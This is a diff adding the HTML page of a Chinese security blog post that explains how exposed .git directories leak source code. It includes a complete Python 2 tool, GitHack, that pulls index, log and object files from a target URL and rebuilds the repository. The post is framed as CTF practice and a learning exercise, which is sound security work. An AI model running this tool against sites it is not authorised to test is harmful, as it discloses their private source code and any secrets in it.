@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言说找时间写，今天终于动手来写一波有关漏洞利用工具的博文。git目录泄漏导致了源码泄漏，是一种很严重的过失。说是过失是因为它其实很容易避免。其实在ctf比赛中还是遇到过很多这样的题型，只要能把整个目录中的重要文件下载下来就可以了，那么怎样下载，就是下面要写的了。 知识点要想下载git目录首先要知道这个目录下的文件都有啥含义。  hooks:这个目录存放一些shell脚本，可以设置特定的git命令">
+<meta name="keywords" content="WEB,TOOLS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="git目录泄漏利用工具">
+<meta property="og:url" content="http://yoursite.com/2018/01/22/git目录泄漏利用工具/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言说找时间写，今天终于动手来写一波有关漏洞利用工具的博文。git目录泄漏导致了源码泄漏，是一种很严重的过失。说是过失是因为它其实很容易避免。其实在ctf比赛中还是遇到过很多这样的题型，只要能把整个目录中的重要文件下载下来就可以了，那么怎样下载，就是下面要写的了。 知识点要想下载git目录首先要知道这个目录下的文件都有啥含义。  hooks:这个目录存放一些shell脚本，可以设置特定的git命令">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:17:30.064Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="git目录泄漏利用工具">
+<meta name="twitter:description" content="前言说找时间写，今天终于动手来写一波有关漏洞利用工具的博文。git目录泄漏导致了源码泄漏，是一种很严重的过失。说是过失是因为它其实很容易避免。其实在ctf比赛中还是遇到过很多这样的题型，只要能把整个目录中的重要文件下载下来就可以了，那么怎样下载，就是下面要写的了。 知识点要想下载git目录首先要知道这个目录下的文件都有啥含义。  hooks:这个目录存放一些shell脚本，可以设置特定的git命令">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/22/git目录泄漏利用工具/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>git目录泄漏利用工具 | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/git目录泄漏利用工具/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">git目录泄漏利用工具
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-01-22 18:42:00" itemprop="dateCreated datePublished" datetime="2018-01-22T18:42:00+08:00">2018-01-22</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:17:30" itemprop="dateModified" datetime="2018-08-04T15:17:30+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全工具/" itemprop="url" rel="index"><span itemprop="name">安全工具</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说找时间写，今天终于动手来写一波有关漏洞利用工具的博文。<br>git目录泄漏导致了源码泄漏，是一种很严重的过失。说是过失是因为它其实很容易避免。其实在ctf比赛中还是遇到过很多这样的题型，只要能把整个目录中的重要文件下载下来就可以了，那么怎样下载，就是下面要写的了。</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>要想下载git目录首先要知道这个目录下的文件都有啥含义。</p>
+<ul>
+<li>hooks:这个目录存放一些shell脚本，可以设置特定的git命令后触发相应的脚本；在搭建gitweb系统或其他git托管系统会经常用到hook script</li>
+<li>info:包含仓库的一些信息</li>
+<li>logs:保存所有更新的引用记录</li>
+<li>objects:所有的Git对象都会存放在这个目录中，对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名</li>
+<li>refs:这个目录一般包括三个子文件夹，heads、remotes和tags，heads中的文件标识了项目中的各个分支指向的当前commit</li>
+<li>COMMIT_EDITMSG:保存最新的commit message，Git系统不会用到这个文件，只是给用户一个参考</li>
+<li>config:这个是GIt仓库的配置文件</li>
+<li>description:仓库的描述信息，主要给gitweb等git托管系统使用</li>
+<li>index:这个文件就是我们前面提到的暂存区（stage），是一个二进制文件</li>
+<li>HEAD:这个文件包含了一个档期分支（branch）的引用，通过这个文件Git可以得到下一次commit的parent</li>
+<li>ORIG_HEAD:HEAD指针的前一个状态</li>
+</ul>
+<p>上面的内容网上很多，可以多了解了解。还有git的基本操作如果都理解的话就可以进行下面的内容了。</p>
+<h2 id="分析利用方法"><a href="#分析利用方法" class="headerlink" title="分析利用方法"></a>分析利用方法</h2><p>其实git目录中是没有源码的明文，也就是说要得到源码，还要使用git命令进行转换的。而且，只要能下载到对象文件就可以了。我有两种想法。</p>
+<ul>
+<li>一般情况下，在暂存区中记录的对象包含了大部分想要获得的文件，说大部分是因为可能有一部分被删除了。所以只分析index文件可能会漏掉一些。</li>
+<li>还有一种是分析logs/HEAD文件，这个文件记录了仓库从创建到最后所有的提交记录以及分支变换等等的记录。但是它并不记录<code>git add .</code>等的添加命令，也就是说没有提交的对象分析不到。但是它会记录已经删除的文件和不同版本的文件。<br>鉴于两种方法的互补，可以按照两种方法分别写出程序，在没有头绪之时考虑是否是方法的弊端导致的漏掉文件。<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Lost "requests" Module.\nyou can execute "pip install requests" to install this module.'</span></span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitHack</span>:</span></span><br><span class="line">    <span class="comment">#params-&gt;hosturl: 远程git仓库url，如：http://url/.git/</span></span><br><span class="line">    <span class="comment">#       -&gt;rootdir: 本地会在这个目录建立git版本库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,hosturl,rootDir=<span class="string">'githack'</span>)</span>:</span></span><br><span class="line">        self.host = hosturl.strip(<span class="string">'/'</span>)+<span class="string">'/'</span></span><br><span class="line">        self.dir = rootDir</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(rootDir):</span><br><span class="line">            os.makedirs(rootDir)</span><br><span class="line">        os.chdir(rootDir)</span><br><span class="line">        os.popen(<span class="string">'git init'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getFile</span><span class="params">(self,urlpath)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        功能：从指定的相对url中获取文件，并存储在本地（使用相同的相对路径）</span></span><br><span class="line"><span class="string">        参数：urlpath是文件相对于self.host的路径</span></span><br><span class="line"><span class="string">        注意：本函数会检查目录路径是否存在，只捕获reqeusts.get的异常</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(self.host+urlpath)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Error!the &#123;&#125; requests failed!'</span>.format(self.host+<span class="string">'.git/'</span>+urlpath)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Error!no such file &#123;&#125;'</span>.format(urlpath)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        a = urlpath.rfind(<span class="string">'/'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">-1</span> != a:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'.git/'</span>+urlpath[:a]):</span><br><span class="line">                os.makedirs(<span class="string">'.git/'</span>+urlpath[:a])</span><br><span class="line">        f = open(<span class="string">'.git/'</span>+urlpath,<span class="string">'w'</span>)</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        r.close()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Download file &#123;&#125; ok!'</span>.format(urlpath)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fromIndex</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        功能：还原暂存区的对象</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        self.getFile(<span class="string">'index'</span>)</span><br><span class="line">        rst = os.popen(<span class="string">'git ls-files --stage'</span>).readlines()</span><br><span class="line">        queryDic = &#123;&#125;</span><br><span class="line">        sucDic = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rst:</span><br><span class="line">            a = i.find(<span class="string">' '</span>)</span><br><span class="line">            b = i.rfind(<span class="string">' '</span>)</span><br><span class="line">            c = i.rfind(<span class="string">'\t'</span>)</span><br><span class="line">            queryDic[i[a+<span class="number">1</span>:b]] = i[c+<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> queryDic:</span><br><span class="line">            <span class="keyword">if</span>(self.getFile(<span class="string">'objects/&#123;&#125;/&#123;&#125;'</span>.format(f[:<span class="number">2</span>],f[<span class="number">2</span>:]))):</span><br><span class="line">                sucDic[f] = queryDic[f]</span><br><span class="line">        <span class="keyword">return</span> sucDic</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fromLogs</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        功能：从logs/HEAD文件开始，还原所有对象</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        self.getFile(<span class="string">'index'</span>)</span><br><span class="line">        self.getFile(<span class="string">'logs/HEAD'</span>)</span><br><span class="line">        self.getFile(<span class="string">'HEAD'</span>)</span><br><span class="line">        self.getFile(<span class="string">'refs/heads/master'</span>)</span><br><span class="line">        logs = []</span><br><span class="line">        queryList = []</span><br><span class="line">        sucDic = &#123;&#125;</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'.git/logs/HEAD'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            logs = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> logs:</span><br><span class="line">            a = l.find(<span class="string">' '</span>)</span><br><span class="line">            queryList.append(l[a+<span class="number">1</span>:a+<span class="number">1</span>+<span class="number">40</span>])</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> queryList:</span><br><span class="line">            <span class="keyword">if</span> self.getFile(<span class="string">'objects/&#123;&#125;/&#123;&#125;'</span>.format(f[:<span class="number">2</span>],f[<span class="number">2</span>:])):</span><br><span class="line">                <span class="comment">#tree</span></span><br><span class="line">                s = os.popen(<span class="string">'git cat-file -p &#123;&#125;'</span>.format(f)).readlines()[<span class="number">0</span>]</span><br><span class="line">                s = s[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">                sucDic.update(self.__getTree(s))</span><br><span class="line">        <span class="keyword">return</span> sucDic</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getTree</span><span class="params">(self,f,prefix=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        功能：递归获取指定tree类型对象下的所有blob对象</span></span><br><span class="line"><span class="string">        参数：f 是指定对象的sha1值，他应该是tree类型</span></span><br><span class="line"><span class="string">        prefix 是前一个tree对象对应的目录，它使用来还原文件的原始路径的。类似于 objects/</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        sucDic = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> self.getFile(<span class="string">'objects/&#123;&#125;/&#123;&#125;'</span>.format(f[:<span class="number">2</span>],f[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> os.popen(<span class="string">'git cat-file -p &#123;&#125;'</span>.format(f)).readlines():</span><br><span class="line">                d = i.find(<span class="string">' '</span>)+<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'tree'</span> == i[d:d+<span class="number">4</span>]:</span><br><span class="line">                    a = i.find(<span class="string">'tree'</span>)+<span class="number">5</span></span><br><span class="line">                    b = i.rfind(<span class="string">'\t'</span>)</span><br><span class="line">                    sucDic.update(self.__getTree(i[a:b],prefix+i[b+<span class="number">1</span>:<span class="number">-1</span>]+<span class="string">'/'</span>))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                a = i.find(<span class="string">'blob'</span>)+<span class="number">5</span></span><br><span class="line">                b = i.rfind(<span class="string">'\t'</span>)</span><br><span class="line">                <span class="keyword">if</span> self.getFile(<span class="string">'objects/&#123;&#125;/&#123;&#125;'</span>.format(i[a:a+<span class="number">2</span>],i[a+<span class="number">2</span>:b])):</span><br><span class="line">                    sucDic[i[a:b]] = prefix+i[b+<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> sucDic</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">saveFile</span><span class="params">(self,sucDic)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        功能：根据sucDic获取文件的内容,他并不是必要的函数，他只是将所有blob对象还原成文件</span></span><br><span class="line"><span class="string">        参数：sucDic类似于&#123;'111...1':'1.txt'&#125;键为对象sha1值，值为对应文件名路径</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sucDic:</span><br><span class="line">            text = os.popen(<span class="string">'git cat-file -p &#123;&#125;'</span>.format(i)).read()</span><br><span class="line">            <span class="comment">#mkdir</span></span><br><span class="line">            a = sucDic[i].rfind(<span class="string">'/'</span>)</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">-1</span> != a):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(sucDic[i][:a]):</span><br><span class="line">                    os.makedirs(sucDic[i][:a])</span><br><span class="line">            f = open(sucDic[i],<span class="string">'w'</span>)</span><br><span class="line">            f.write(text)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'save file &#123;&#125;.'</span>.format(sucDic[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'''usage:python githack.py hosturl [rootdir] [fromlogs]</span></span><br><span class="line"><span class="string">                    params：hosturl为包含git目录的url</span></span><br><span class="line"><span class="string">                            rootdirgit目录会下载到该目录</span></span><br><span class="line"><span class="string">                            fromlogs可以为任意值即可变为第二个模式。</span></span><br><span class="line"><span class="string">                    本脚本有两个模式（默认1）：1.下载暂存区的文件。2.从logs中遍历所有对象'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    没怎么处理异常，也没美化命令行，有时间做</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    log = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">3</span>:</span><br><span class="line">        rootdir = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv)==<span class="number">2</span>:</span><br><span class="line">        rootdir = <span class="string">'githack'</span></span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv)==<span class="number">4</span>:</span><br><span class="line">        log = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        usage()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    g = GitHack(sys.argv[<span class="number">1</span>],rootdir)</span><br><span class="line">    <span class="keyword">if</span> log:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'from Logs mod!'</span></span><br><span class="line">        sucDic = g.fromLogs()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'from index mod!'</span></span><br><span class="line">        sucDic = g.fromIndex()</span><br><span class="line">    <span class="comment">#print sucDic</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    g.saveFile(sucDic)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>源码也可以到我的码云上下载 <a href="https://gitee.com/ktstart/githack" title="我的githack" target="_blank" rel="noopener">我的githack</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个工具很早之前就有简洁版本，现在重新写了一遍，对git工具的使用和git目录又熟悉了不少。虽然网络上早有此类工具，但自己写出来还是有不少感悟，以后多写多练。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+            <a href="/tags/TOOLS/" rel="tag"># TOOLS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/18/赛博地球杯工业互联网安全大赛web题--工控系统的敏感消息遭泄漏/" rel="next" title="赛博地球杯工业互联网安全大赛web题--工控系统的敏感消息遭泄漏">
+                <i class="fa fa-chevron-left"></i> 赛博地球杯工业互联网安全大赛web题--工控系统的敏感消息遭泄漏
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/24/pwnable.kr-shellshock/" rel="prev" title="pwnable.kr-shellshock">
+                pwnable.kr-shellshock <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
